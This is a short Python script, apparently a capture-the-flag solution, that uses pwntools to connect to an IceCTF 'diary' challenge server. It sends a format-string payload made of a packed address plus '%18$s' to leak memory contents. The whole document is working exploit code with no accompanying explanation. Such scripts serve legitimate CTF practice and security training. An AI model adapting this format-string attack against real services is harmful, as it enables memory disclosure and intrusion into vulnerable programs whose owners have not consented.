#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, socket
from pwn import *
from struct import pack, unpack

sh = '\xa0\xa0\x04\x08 %18$s'
p = remote("diary.vuln.icec.tf", 6501)
log.info(p.recvuntil(">"))
p.clean()
p.sendline('1')
log.info(p.recv())
p.clean()
p.sendline(sh)
log.info(p.recv())
p.clean()
p.sendline('2')
log.info(p.recvuntil("\n"))
